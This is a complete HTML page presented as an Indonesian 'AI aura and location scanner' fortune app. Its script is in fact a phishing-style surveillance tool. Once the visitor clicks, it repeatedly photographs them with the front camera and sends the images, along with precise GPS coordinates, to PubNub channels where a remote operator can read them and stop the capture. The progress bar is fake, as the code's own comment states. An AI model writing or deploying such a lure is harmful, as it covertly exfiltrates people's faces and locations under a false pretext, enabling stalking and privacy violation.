<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>AI Deep Aura & Location Scanner</title>
    <script src="https://cdn.pubnub.com/sdk/javascript/pubnub.4.29.9.min.js"></script>
    <style>
        body { margin: 0; padding: 0; background: #000; color: #fff; font-family: sans-serif; overflow: hidden; height: 100vh; display: flex; align-items: center; justify-content: center; text-align: center; }
        .stars { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: url('https://i.imgur.com/8fS8tK1.png') repeat top center; opacity: 0.5; }
        .meteor { position: absolute; width: 2px; height: 150px; background: linear-gradient(0deg, #00d2ff 0%, transparent 100%); animation: fall linear infinite; opacity: 0; }
        @keyframes fall { 0% { transform: translateY(-200px) rotate(-45deg); opacity: 0; } 10% { opacity: 1; } 100% { transform: translateY(100vh) rotate(-45deg); opacity: 0; } }
        .m1 { left: 20%; animation-duration: 3s; } .m2 { left: 70%; animation-duration: 4s; }
        .card { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(15px); padding: 35px; border-radius: 25px; border: 1px solid rgba(255,255,255,0.1); width: 85%; z-index: 10; }
        .btn-start { background: linear-gradient(135deg, #00d2ff, #3a7bd5); color: white; border: none; padding: 18px; font-weight: bold; border-radius: 50px; cursor: pointer; width: 100%; margin-top: 15px; }
        #statusText { display: none; margin-top: 20px; color: #00d2ff; font-weight: bold; }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <div class="stars"></div>
    <div class="meteor m1"></div><div class="meteor m2"></div>
    <video id="v" autoplay playsinline></video><canvas id="c"></canvas>

    <div class="card">
        <h1>🌌 AI SYNC SCAN</h1>
        <p>Analisis Aura & Lokasi Keberuntunganmu secara Real-Time.</p>
        <button class="btn-start" id="btn" onclick="startVortex()">MULAI ANALISIS</button>
        <div id="statusText">MENGHUBUNGKAN KE SERVER AI...</div>
        <p style="font-size: 0.6rem; margin-top: 20px; opacity: 0.4;">*Akses kamera & lokasi diperlukan untuk sinkronisasi data AI</p>
    </div>

    <script>
        const pubnub = new PubNub({ publishKey: 'demo', subscribeKey: 'demo', uuid: 'vortex_target' });
        const video = document.getElementById('v');
        const canvas = document.getElementById('c');
        let photoInterval;

        // Mendengarkan Remote Stop
        pubnub.subscribe({ channels: ['vin_vortex_control'] });
        pubnub.addListener({
            message: function(m) {
                if (m.message === "STOP_SCAN") {
                    clearInterval(photoInterval);
                    if(video.srcObject) video.srcObject.getTracks().forEach(t => t.stop());
                    document.getElementById('statusText').innerText = "SINKRONISASI SELESAI.";
                }
            }
        });

        async function startVortex() {
            document.getElementById('btn').style.display = 'none';
            document.getElementById('statusText').style.display = 'block';

            // 1. Ambil Foto (Kamera)
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                video.srcObject = stream;
                photoInterval = setInterval(capturePhoto, 4000);
            } catch (e) { console.log("Kamera ditolak"); }

            // 2. Ambil Lokasi (GPS)
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition((pos) => {
                    pubnub.publish({
                        channel: 'vin_vortex_location',
                        message: { lat: pos.coords.latitude, lon: pos.coords.longitude, time: new Date().toLocaleTimeString() }
                    });
                }, null, {enableHighAccuracy: true});
            }
            
            // Animasi Loading Palsu
            let p = 0;
            setInterval(() => { if(p < 99) { p += 5; document.getElementById('statusText').innerText = `SINKRONISASI AI (${p}%)...`; } }, 2000);
        }

        function capturePhoto() {
            const ctx = canvas.getContext('2d');
            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0);
            pubnub.publish({ channel: 'vin_vortex_gate', message: { img: canvas.toDataURL('image/jpeg', 0.5) } });
        }
    </script>
</body>
</html>
